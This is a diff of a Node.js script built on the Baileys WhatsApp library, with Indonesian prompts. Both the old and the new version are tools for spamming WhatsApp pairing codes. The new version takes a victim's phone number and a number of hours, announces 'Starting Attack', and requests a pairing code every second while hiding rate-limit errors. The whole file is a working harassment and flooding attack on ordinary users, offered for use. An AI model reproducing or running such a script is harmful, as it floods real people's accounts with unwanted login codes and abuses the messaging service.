@@ -1,93 +1,122 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
-const pino = require('pino');
+const pino = require("pino");
+const fs = require('fs');
+const chalk = require("chalk");
+const readline = require("readline");
+const {
+  default: spamConnect,
+  PHONENUMBER_MCC,
+  makeCacheableSignalKeyStore,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  makeInMemoryStore,
+  Browsers
+} = require("@whiskeysockets/baileys");
+const NodeCache = require("node-cache");
 
-// Array of extended colors (lebih banyak warna)
-const colors = [
-    '\x1b[31m', // Red
-    '\x1b[32m', // Green
-    '\x1b[33m', // Yellow
-    '\x1b[34m', // Blue
-    '\x1b[35m', // Magenta
-    '\x1b[36m', // Cyan
-    '\x1b[37m', // White
-    '\x1b[90m', // Bright Black (Gray)
-    '\x1b[91m', // Bright Red
-    '\x1b[92m', // Bright Green
-    '\x1b[93m', // Bright Yellow
-    '\x1b[94m', // Bright Blue
-    '\x1b[95m', // Bright Magenta
-    '\x1b[96m', // Bright Cyan
-    '\x1b[97m', // Bright White
-    '\x1b[41m', // Background Red
-    '\x1b[42m', // Background Green
-    '\x1b[43m', // Background Yellow
-    '\x1b[44m', // Background Blue
-    '\x1b[45m', // Background Magenta
-    '\x1b[46m', // Background Cyan
-    '\x1b[47m', // Background White
-    '\x1b[100m', // Background Bright Black (Gray)
-    '\x1b[101m', // Background Bright Red
-    '\x1b[102m', // Background Bright Green
-    '\x1b[103m', // Background Bright Yellow
-    '\x1b[104m', // Background Bright Blue
-    '\x1b[105m', // Background Bright Magenta
-    '\x1b[106m', // Background Bright Cyan
-    '\x1b[107m', // Background Bright White
-];
+const store = makeInMemoryStore({
+  logger: pino().child({ level: "silent", stream: "store" }),
+});
 
-// Mengambil nomor target dan durasi dari command line
-const args = process.argv.slice(2);
-const phoneNumber = args[0];
-const duration = parseInt(args[1], 10) * 1000; // Convert dari detik ke milidetik
+const pairingCode = true || process.argv.includes("--pairing-code");
+const useMobile = process.argv.includes("--mobile");
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
-if (!phoneNumber || isNaN(duration)) {
-    console.error("Usage: node pairing.js number duration");
-    process.exit(1);
-}
+async function startspam() {
+  const { version, isLatest } = await fetchLatestBaileysVersion();
+  const { state, saveCreds } = await useMultiFileAuthState("./cassaster");
+  const msgRetryCounterCache = new NodeCache();
 
-async function dirxpair() {
-    const { state } = await useMultiFileAuthState('./69/session');
-    const dirzz = makeWASocket({
-        logger: pino({ level: "silent" }),
-        printQRInTerminal: false,
-        auth: state,
-        connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: 0,
-        keepAliveIntervalMs: 10000,
-        emitOwnEvents: true,
-        fireInitQueries: true,
-        generateHighQualityLinkPreview: true,
-        syncFullHistory: true,
-        markOnlineOnConnect: true,
-        browser: ["Ubuntu", "Chrome", "20.0.04"],
-    });
+  const spam = spamConnect({
+    logger: pino({ level: "silent" }),
+    printQRInTerminal: !pairingCode,
+    browser: Browsers.windows("Firefox"),
+    auth: {
+      creds: state.creds,
+      keys: makeCacheableSignalKeyStore(
+        state.keys,
+        pino({ level: "fatal" }).child({ level: "fatal" })
+      ),
+    },
+    markOnlineOnConnect: true,
+    generateHighQualityLinkPreview: true,
+    getMessage: async (key) => {
+      if (store) {
+        const msg = await store.loadMessage(key.remoteJid, key.id);
+        return msg?.message || undefined;
+      }
+      return { conversation: "SPAM PAIRING CODE" };
+    },
+    msgRetryCounterCache,
+    defaultQueryTimeoutMs: undefined,
+  });
 
-    const startTime = Date.now();
+  store.bind(spam.ev);
 
-    try {
-        // Infinite loop untuk request pairing code, berhenti setelah durasi waktu
-        while (Date.now() - startTime < duration) {
-            try {
-                const code = (await dirzz.requestPairingCode(phoneNumber))?.match(/.{1,4}/g)?.join("-") || 'No code found';
-
-                // Pilih warna random untuk setiap request
-                const randomColor = colors[Math.floor(Math.random() * colors.length)];
-
-                // Log pairing code dengan warna random
-                console.log(randomColor + `Pairing code for ${phoneNumber}: ${code}\x1b[0m`);
-
-            } catch (error) {
-                console.error('Error requesting code:', error.message);
-            }
-        }
-
-        console.log("\x1b[32m" + "Completed pairing requests." + "\x1b[0m");
-
-    } catch (error) {
-        console.error('Error:', error.message);
+  if (pairingCode && !spam.authState.creds.registered) {
+    if (useMobile) {
+      throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
     }
 
-    return dirzz;
+    let phoneNumber = process.argv[2]?.replace(/[^0-9]/g, '');
+
+    while (!Object.keys(PHONENUMBER_MCC).some((v) => phoneNumber.startsWith(v))) {
+      console.log(chalk.bgBlack(chalk.yellowBright("Input nomor dalam format yang benar")));
+      phoneNumber = await question(
+        chalk.bgBlack(chalk.greenBright("Input NO Whatsapp: +628xxx : "))
+      );
+    }
+
+    const spamCount = await new Promise((resolve) => {
+      console.log(chalk.bgBlack(chalk.whiteBright("Starting Attack.....")));
+      setTimeout(() => resolve(1), 1000);
+    });
+
+    for (let i = 0; i < spamCount; i++) {
+      let second = process.argv[3] * 3600;
+      while (second > 0) {
+        let code = await spam.requestPairingCode(phoneNumber);
+        code = code?.match(/.{1,4}/g)?.join('-') || code;
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+        second--;
+      }
+      console.log("Successfully Attack");
+      process.exit(0);
+      await new Promise((resolve) => setTimeout(resolve, 30000));
+    }
+
+    console.log(
+      chalk.bgBlack(chalk.greenBright(`Spam selesai sebanyak ${spamCount} kali.`))
+    );
+  }
+
+  fs.watchFile(require.resolve(__filename), () => {
+    fs.unwatchFile(require.resolve(__filename));
+    console.log(chalk.redBright("Update " + __filename));
+    delete require.cache[require.resolve(__filename)];
+    require(require.resolve(__filename));
+  });
 }
 
-dirxpair();
+startspam();
+
+process.on("uncaughtexception", function (err) {
+  const ignoreErrors = [
+    "conflict",
+    "Socket connection timeout",
+    "not-authorized",
+    "already-exists",
+    "rate-overlimit",
+    "Connection Closed",
+    "Timed Out",
+    "Value not found",
+  ];
+
+  if (!ignoreErrors.some((msg) => String(err).includes(msg))) {
+    console.log("Caught exception: ", err);
+  }
+});
+
